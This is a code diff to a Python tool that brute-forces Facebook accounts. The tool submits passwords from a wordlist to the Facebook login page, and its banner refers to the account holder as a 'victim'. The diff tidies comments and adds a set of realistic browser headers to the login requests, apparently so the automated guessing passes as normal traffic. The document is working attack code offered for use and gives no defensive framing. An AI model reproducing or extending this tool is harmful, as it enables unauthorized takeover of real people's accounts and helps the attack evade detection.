@@ -7,7 +7,7 @@
 import sys
 import random
 import mechanize
-import http.cookiejar  # Updated import for Python 3
+import http.cookiejar
 
 GHT = '''
         +=========================================+
@@ -30,8 +30,8 @@ print("Note: - This tool can crack Facebook accounts even if you don't have the 
 print("# Hit CTRL+C to quit the program")
 print("# Use www.graph.facebook.com for more infos about your victim ^_^")
 
-email = input("[+] Enter Email, Phone Number or ID: ")  # Updated input() for Python 3
-passwordlist = input("[+] Enter the name of the password list file : ")  # Updated input() for Python 3
+email = input("[+] Enter Email, Phone Number or ID: ")
+passwordlist = input("[+] Enter the name of the password list file : ")
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
 
@@ -40,7 +40,15 @@ def attack(password):
     try:
         sys.stdout.write("\r[*] trying %s.. " % password)
         sys.stdout.flush()
-        br.addheaders = [('User-agent', random.choice(useragents))]
+        br.addheaders = [('User-agent', random.choice(useragents)),
+                         ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
+                         ('Accept-Encoding', 'gzip, deflate, lzma, sdch'),
+                         ('Accept-Language', 'en-US,en;q=0.8'),
+                         ('Cache-Control', 'max-age=0'),
+                         ('Connection', 'keep-alive'),
+                         ('Host', 'www.facebook.com'),
+                         ('Referer', 'https://www.facebook.com'),
+                         ('Upgrade-Insecure-Requests', '1')]
         site = br.open(login)
         br.select_form(nr=0)
 
@@ -71,7 +79,7 @@ def check():
     global passwords
     try:
         br = mechanize.Browser()
-        cj = http.cookiejar.LWPCookieJar()  # Updated reference for Python 3
+        cj = http.cookiejar.LWPCookieJar()
         br.set_handle_robots(False)
         br.set_handle_equiv(True)
         br.set_handle_referer(True)
@@ -82,7 +90,7 @@ def check():
         print("\n[*] Exiting program ..\n")
         sys.exit(1)
     try:
-        with open(passwordlist, "r") as file:  # Updated file handling for Python 3
+        with open(passwordlist, "r") as file:
             passwords = file.readlines()
             k = 0
             while k < len(passwords):
